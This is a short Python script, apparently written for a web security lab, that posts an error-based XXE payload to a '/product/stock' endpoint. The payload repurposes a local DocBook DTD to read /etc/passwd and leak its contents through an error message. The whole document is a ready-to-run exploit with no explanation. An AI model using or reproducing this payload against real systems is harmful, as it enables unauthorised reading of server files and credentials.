import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]+'/product/stock'

burp_headers = {"Content-Type": "application/xml"}
burp_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE message [\r\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\r\n<!ENTITY % ISOamso '\r\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\r\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\r\n&#x25;eval;\r\n&#x25;error;\r\n'>\r\n%local_dtd;\r\n]><stockCheck>\r\n<productId>3</productId><storeId>1</storeId></stockCheck>"
requests.post(burp_url, headers=burp_headers, data=burp_data)
